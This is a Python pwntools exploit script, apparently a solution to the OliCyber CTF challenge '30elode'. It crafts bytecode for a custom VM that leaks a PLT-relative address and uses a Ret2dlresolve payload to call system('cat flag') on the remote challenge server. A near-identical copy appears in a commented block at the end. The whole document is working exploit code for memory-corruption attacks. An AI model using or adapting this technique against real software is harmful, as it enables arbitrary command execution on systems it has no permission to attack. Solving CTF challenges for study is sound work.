# Ho scritto questa VM per il mio corso universitario di sistemi operativi. C'è ancora un sacco di codice 
# da aggiungere, ma per il momento ne sono fiera. Puoi controllarla per me? Voglio 30 e lodeeeeeeeeeeeeeeee!

from pwn import *

context.log_level = 'error'
# ottieni il nome del file ELF corrente (senza estensione .py)
filename = __file__.replace('.py', '')
exe = context.binary = ELF(filename, checksec=False)
# parametri di connessione
HOST = "30elode.challs.olicyber.it"
PORT = 38301
io = remote(HOST, PORT)
# funzioni helper per la costruzione dei bytecode
def b(op, s, d):
	return p8(op) + p8((s << 4) | d) + b'\0' * 2
def pi8(i):
	return p8(9) + p8(0) + p8(i) + b'\0'
def pi16(i):
	return p8(9) + p8(1) + p16(i)
def pi32(i):
	return pi16(i >> 16) + pi16(i & 0xffff)
def pi64(i):
	return pi32(i >> 32) + pi32(i & 0xffffffff)
def pop(r):
	return p8(0xa) + p8(r) + b'\0' * 2
def seti(i, r):
	return p8(0xe) + p16(i) + p8(r)
def save():
	return p8(0xc) + b'\0' * 3
def restore():
	return p8(0xd) + b'\0' * 3

# costruzione del payload
full = restore()
LEAK = 0x1cfe
PLT = exe.get_section_by_name('.plt').header.sh_addr
full += seti(LEAK - PLT, 0) + b(1, 12, 0)
dl = Ret2dlresolvePayload(exe, "system", ["whatever"], exe.sym["regs"])
full += seti(dl.reloc_index, 11) + save()
# inserisci il payload dlresolve nei registri
for i in range(len(dl.payload) // 8):
	chunk = dl.payload[8 * i : 8 * (i + 1)]
	full += pi64(u64(chunk))
	full += pop(i)
# comando da eseguire
full += b"cat flag >&2"
# padding per allineamento a 4 byte
if len(full) % 4:
	full = full.ljust((len(full) // 4 + 1) * 4, b'\0')
# invio del payload
io.sendlineafter(b"Code size (bytes): ", str(len(full)).encode())
io.sendafter(b"Code: ", full)
# ricezione e stampa della flag
flag = io.recvuntil(b'flag{').split(b'flag{')[-1] + io.recvuntil(b'}').strip()
print((b'flag{' + flag).decode())
io.close()



# pocket 
'''
context.log_level = 'error'
filename = __file__.replace('.py','') # Il file l'ho messo ma assicurati di averlo anche tu se runni questo script
exe = context.binary = ELF(filename, checksec=False)
HOST,PORT = "30elode.challs.olicyber.it", 38301
io = remote(HOST,PORT)

def b(op,s,d): return p8(op)+p8(s<<4|d)+b'\0'*2
def pi8(i): return p8(9)+p8(0)+p8(i)+b'\0'
def pi16(i): return p8(9)+p8(1)+p16(i)
def pi32(i): return pi16(i>>16)+pi16(i&0xffff)
def pi64(i): return pi32(i>>32)+pi32(i&0xffffffff)
def pop(r): return p8(0xa)+p8(r)+b'\0'*2
def seti(i,r): return p8(0xe)+p16(i)+p8(r)
def save(): return p8(0xc)+b'\0'*3
def restore(): return p8(0xd)+b'\0'*3

full = restore()
LEAK=0x1cfe; 
PLT = exe.get_section_by_name('.plt').header.sh_addr
full += seti(LEAK-PLT,0)+b(1,12,0)
dl = Ret2dlresolvePayload(exe,"system",["whatever"],exe.sym["regs"])
full += seti(dl.reloc_index,11)+save()
for i in range(len(dl.payload)//8): full += pi64(u64(dl.payload[8*i:8*(i+1)]))+pop(i)
full += b"cat flag >&2"
if len(full)%4: full=full.ljust((len(full)//4+1)*4,b'\0')
io.sendlineafter(b"Code size (bytes): ",str(len(full)).encode())
io.sendafter(b"Code: ",full)
flag = io.recvuntil(b'flag{').split(b'flag{')[-1] + io.recvuntil(b'}').strip()
print((b'flag{' + flag).decode())
io.close()
'''